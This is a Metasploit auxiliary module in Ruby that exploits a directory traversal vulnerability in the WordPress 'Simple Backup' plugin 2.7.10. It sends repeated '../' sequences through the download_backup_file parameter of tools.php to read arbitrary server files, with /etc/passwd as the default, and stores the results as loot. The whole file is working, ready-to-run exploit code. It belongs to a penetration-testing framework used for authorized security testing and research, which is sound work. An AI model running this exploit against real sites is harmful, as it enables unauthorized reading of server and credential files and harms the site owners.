##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Simple Backup File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "Simple Backup" version 2.7.10, allowing to read arbitrary files with the
        web server privileges.
      },
      'References'     =>
        [
          ['WPVDB', '7997'],
          ['PACKETSTORM', '131919']
        ],
      'Author'         =>
        [
          'Mahdi.Hidden', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 6 ])
      ])
  end

  def check
    check_plugin_version_from_readme('simple-backup', '2.7.11')
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_backend, 'tools.php'),
      'vars_get' =>
        {
          'page'  => 'backup_manager',
          'download_backup_file' => "#{traversal}#{filename}"
        }
    )

    unless res && res.body
      vprint_error("Server did not respond in an expected way.")
      return
    end

    if res.code == 200 &&
        res.body.length > 0 &&
        res.headers['Content-Disposition'] &&
        res.headers['Content-Disposition'].include?('attachment; filename') &&
        res.headers['Content-Length'] &&
        res.headers['Content-Length'].to_i > 0

      vprint_line("#{res.body}")
      fname = datastore['FILEPATH']

      path = store_loot(
        'simplebackup.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("File saved in: #{path}")
    else
      vprint_error("Nothing was downloaded. You can try to change the DEPTH parameter or verify the correct filename.")
    end
  end
end
